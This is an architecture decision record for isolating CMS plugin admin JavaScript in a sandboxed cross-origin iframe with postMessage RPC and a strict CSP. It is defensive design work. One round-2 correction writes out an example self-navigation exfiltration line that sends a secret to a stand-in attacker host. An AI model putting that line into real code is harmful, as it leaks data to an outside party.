# ADR-025: Plugin Client / Admin JS Isolation — Sandboxed Cross-Origin Iframe + postMessage RPC (Generalizes ADR-020)

- Status: ACCEPTED 2026-07-16 (owner sign-off; debated 2026-07-08, 2-round plugin-roadmap swarm debate, 3-1 majority converge, agy dissented in favor of deferring to Tier-2 UI work; audited clean; the decide-now item that unblocks OQ-07)
- Author: Leon Aburime / Coordinator (Opus 4.8 Primary) with peers Codex `gpt-5.5`, Gemini 3.1 (`agy`), Fable
- Extends: **ADR-020 §6-correction** (generalizes the theme separate-origin + CSP rule to plugin client JS)
- Relates: **ADR-024** (§8 records this as its own decide-now ADR; §3 serializable ABI is the shape this RPC follows), ADR-021 (the operator session this protects), ADR-013/014 (assistant/admin surfaces that will host plugin panels), ADR-022 (core admin mutation APIs a hijacked session could call), OQ-07 (admin-surface / extension-panel registry — blocked on this)

## Context

Plugins that contribute **admin panels, settings screens, or editor extensions** ship
**browser JavaScript**. ADR-024's Tier-1/2/3 model governs a plugin's *server-side*
execution, but says nothing about where its **client** code runs — and that is a distinct,
equally dangerous boundary.

The threat is the one ADR-020 already discovered for **theme** JS and fixed in its §6
correction: **a CMS admin renders in the same origin as the logged-in operator session**
(ADR-021). Any JavaScript that runs **same-origin** with that session can call core admin
mutation APIs (ADR-022's write chokepoint, ADR-018's command gateway, etc.) using the
operator's **own cookie**, via a plain `fetch()`. It can also read session storage and
`localStorage`. So a "fun little settings widget" from an untrusted plugin can silently
perform **any action the logged-in operator can** — create admin principals, publish or
delete content, exfiltrate secrets — with no exploit, just same-origin trust.

ADR-020 §6 corrected exactly this for themes and **explicitly deferred the plugin-side
version to its own ADR** (ADR-020 Follow-ups; ADR-024 §8 confirms the dependency and marks
admin-panel work OQ-07 blocked until it lands). This is that ADR.

Full trace + decision ledger (#7): `.local-artifacts/swarm-consensus/runs/20260708T195959Z-plugin-system-roadmap/consensus-report.md`.

## Decision

### 1. Plugin client JS runs in a sandboxed, cross-origin iframe — never on the admin origin

Any plugin-contributed browser code (admin panel, settings UI, editor extension, client
island) is rendered inside a **sandboxed iframe served from a separate, cookie-less,
credential-isolated origin** — never inline on, and never same-origin with, the Tovu
admin/author session. This is ADR-020 §6's "separate cookie-less origin" rule, generalized
from themes to plugins. Because the origin carries no session cookie and no admin
`localStorage`, a hostile plugin panel has **no ambient authority to steal**.

### 2. It talks to core only through a `postMessage` RPC — no live objects cross the boundary

The iframe communicates with the host admin shell **exclusively** over a **`postMessage`
RPC** channel. The host validates `origin` **and** `event.source` (the exact registered
`iframe.contentWindow`, not origin string alone) on every message, and attributes each
inbound message to one specific registered plugin-frame instance — not merely "some frame
from the trusted origin" (2026-07-15 `/audit-work` finding C-02, converged Codex + Fable: if
multiple plugin frames ever share one delivery origin, origin-only validation cannot
distinguish plugin A, which was granted a capability, from plugin B, which was not — B could
claim A's plugin id in a message and pass the origin check identically). The plugin frame
never receives a live core object, DOM handle, or session token. Payloads are **serializable
only** — deliberately aligned with **ADR-024 §3's transport-agnostic ABI** (async,
structured-clone-safe, capabilities by handle not by reference). The client boundary and
the server boundary are therefore the *same shape*, which is what lets a plugin's client
and server halves share one capability model.

### 3. A strict CSP with `connect-src` locked down (no ambient egress)

The plugin frame ships with a **strict CSP** — at minimum `connect-src` restricted so the
frame cannot make arbitrary network calls back to the admin origin or exfiltrate freely
(ADR-020 §6's `connect-src 'none'` baseline for pure client JS; any network a plugin needs
is a **declared capability mediated by core over the RPC**, not a raw `fetch` from the
frame). Every privileged action the panel wants is an **explicit, capability-checked RPC
call the host authorizes**, subject to ADR-021 authorization — not something the frame can
do on its own because it happens to share an origin.

**Correction (2026-07-15 `/audit-work` finding C-01, converged Codex GPT-5.6-terra + Fable):**
`connect-src` alone only governs `fetch`/`XHR`/`WebSocket`/`sendBeacon`-style script-initiated
network calls — it does **not** cover image/font loading (`img-src`), form submission
(`form-action`), or navigation (`frame-src`/top-level navigation), each of which is a real,
CSP-uncovered exfiltration channel for whatever data a permitted RPC call already handed the
frame. "At minimum `connect-src`" is corrected to a **full deny-by-default baseline**:
`default-src 'none'; script-src <frame-bundle-origin>; img-src 'none' (or an explicit allowed
set); font-src 'none' (or an explicit allowed set); form-action 'none'; frame-src 'none'`, plus
the iframe's own `sandbox` attribute without `allow-top-navigation`. Any exception to this
baseline is itself a declared, host-mediated capability — never an ambient CSP allowance.

**Round-2 correction (2026-07-15 `/audit-work` round-2 finding C-R2-01, Codex GPT-5.6-terra,
validated blocker on the round-1 fix itself):** the round-1 baseline above is still
incomplete. `sandbox` without `allow-top-navigation` blocks the frame from navigating its
**parent's** browsing context, and `frame-src` governs which URLs the document may embed as
**child** frames — neither blocks the frame from navigating **itself**
(`window.location = 'https://attacker.example/?d=' + secret`, or a same-frame link click),
which carries whatever data an RPC call handed the frame to an attacker-controlled URL via
the resulting HTTP request.

**Round-3 correction (2026-07-15 `/audit-work` round-3, Fable — the round-2 fix itself was
wrong and is corrected here rather than re-proposed a third time):** the round-2 text closed
this with a CSP `navigate-to` directive. `navigate-to` never shipped — it was proposed for
CSP Level 3, implemented behind an experimental flag in Chrome only, and has since been
dropped from the spec's mainline; no currently-shippable browser enforces it. There is **no
CSP or `sandbox` mechanism that prevents a frame from navigating its own browsing context** —
self-navigation is ordinary, unprivileged script behavior available to any document,
independent of origin or CSP posture, and a suggested `beforeunload`-based host-side
interception does not work either (`beforeunload` runs inside the navigating document itself,
which is the attacker-controlled code being defended against; the parent has no API to
observe or veto a cross-origin child's navigation before its HTTP request fires). This channel
is **not closed by a network-policy control** — it is closed, to the extent it can be, by
**data minimization at the RPC layer**: the host must never hand the frame a capability
response containing data sensitive enough that its exfiltration via a single outbound GET
request (the only thing this channel can carry — one navigation, one URL, no follow-up) would
be a meaningfully worse outcome than the frame already having read it. This is an explicit,
disclosed **residual risk**, not a solved boundary: bounded in severity because (a) the frame
is cookie-less (no session to steal — unaffected by this gap), and (b) it can leak only
whatever an already-consented, already-capability-gated RPC response contained, once, as a
URL. The panel-registry/RPC-verb-catalog design (Open item 1) must treat "would this response
be safe to leak via a single outbound URL" as a normative constraint on what any RPC verb is
allowed to return to a plugin frame.

### 4. Capability-gated, consistent with ADR-024

Contributing a client surface is a **capability** (ADR-024 §6 namespace; e.g.
`ui.adminPanel`), default-deny, surfaced at install consent. The host renders a plugin's
frame and grants RPC verbs **only** for capabilities the plugin was consented. This keeps
client UI on the **same separate axis** as human authorization (ADR-021) and the same
deny-by-default vocabulary as the rest of the plugin capability set. Per the C-02 correction
above, "the plugin was consented" must resolve to a specific registered frame instance
(§2's `event.source` binding), not to "any message from the delivery origin" — otherwise
default-deny holds per-origin but not per-plugin.

### 5. This is a decide-now boundary, built early (recovery-ladder-aligned)

The **decision** (separate origin + RPC + CSP + capability gate) is frozen now because it
is a boundary, and boundaries are expensive to move once plugins depend on the DOM they are
handed. The **full mechanism** (the iframe host component, the RPC verb catalog, the panel
registry) is built alongside the admin-panel work it unblocks — but never in a way that
first ships a same-origin panel and retrofits isolation later.

## Consequences

- **Closes the plugin admin-UI session-theft hole** that ADR-020 §6 flagged for themes —
  now for plugins too, with the same mechanism, so there is one origin-isolation story
  across themes and plugins rather than two.
- **Unblocks OQ-07** — the admin-surface / extension-panel registry is designable once the
  boundary is fixed; ADR-024 §8 named this as the blocker.
- **One boundary shape, client and server.** Reusing ADR-024 §3's serializable ABI for the
  `postMessage` RPC means a plugin author learns one capability/serialization model, and a
  future move to out-of-process server isolation does not create a second, divergent client
  contract.
- **Real DX cost, accepted.** Plugin panels cannot reach into the host DOM or call admin
  APIs directly; everything privileged is an async RPC round-trip. This is the same
  front-loaded cost ADR-024 §3 accepts for the server ABI, for the same reason: it is the
  price of a retrofit-free path to safe third-party UI.
- **Does not, by itself, sandbox Tier-3 server code** — this ADR is the *client* boundary
  only. A Tier-3 plugin's *server* half still has full machine access until ADR-024 §4
  isolation ships. The two boundaries are complementary, not substitutes.

## Open

- **RPC verb catalog** — the concrete set of host-mediated verbs (read config, request a
  capability-checked mutation, subscribe to host events) is designed alongside the panel
  registry; frozen only when OQ-07 is built.
- **Separate-origin delivery mechanism** — sandboxed iframe on a distinct local origin vs a
  dedicated theme/plugin domain (ADR-020 left the same choice open for themes). Pick once,
  for both, when the host component is built; the *rule* (cookie-less, credential-isolated)
  is fixed here regardless. **Security-relevant, not just a delivery detail (2026-07-15
  correction, finding C-02):** whatever origin scheme is chosen must still let the host
  attribute each message to one specific plugin-frame instance (§2's `event.source`
  binding) — if multiple plugins ever share one origin, origin validation alone cannot
  enforce default-deny per-plugin, so the mechanism must carry a per-frame identity (a
  bound `MessageChannel` or nonce issued at frame creation) regardless of which origin
  scheme wins.
- **Editor-extension ergonomics** — TipTap/editor plugin surfaces (ADR-016/017) need richer
  host↔frame interaction than a settings panel; whether that stays pure RPC or needs a
  constrained shared render-IR seam is deferred to editor-extension design.

## Debate record

Recorded as decision-ledger item **#7** of the 2-round plugin-roadmap planning debate.
**Majority decide-now:** Codex, Fable, and Primary held that this is cheap (it generalizes
machinery ADR-020 already built for themes) and that it blocks admin-panel design (OQ-07),
so it should be decided now rather than deferred. **Dissent (recorded, not adopted):** agy
would **defer** this to Tier-2 UI work, on the view that client-surface design can wait
until the sandbox exists. The majority judged the boundary decision separable from — and
cheaper than — the sandbox mechanism, and worth fixing before any plugin ships a panel that
would have to be un-shipped. Full trace: `.local-artifacts/swarm-consensus/runs/20260708T195959Z-plugin-system-roadmap/consensus-report.md`.

**Decide-now risk disclosure (2026-07-15 `/audit-work` finding C-03, Fable):** the
majority's rationale is reaffirmed — the `/audit-work` batch found no evidence that
deferring would have been safer. But the original text disclosed only the RPC verb catalog
(Open item 1) as a deferred detail; it did not disclose that **per-plugin origin/message
attribution granularity (Open item, above) is itself security-relevant**, not a pure
delivery-mechanism choice. Freezing the boundary principle now remains correct; this note
exists so that freezing it does not silently under-specify a property the eventual
mechanism must satisfy.
